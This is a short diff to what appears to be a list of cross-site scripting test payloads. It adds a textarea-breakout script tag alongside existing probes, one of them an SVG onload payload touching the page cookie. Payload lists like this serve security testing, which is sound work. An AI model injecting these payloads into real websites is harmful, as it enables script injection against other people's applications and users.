@@ -11,3 +11,5 @@ javascript:alert(1)
 '"><script>alert(1)</script>
 
 "><svg/onload=alert(doucument.cookie)>
+
+</textarea><script>alert(1)</script>
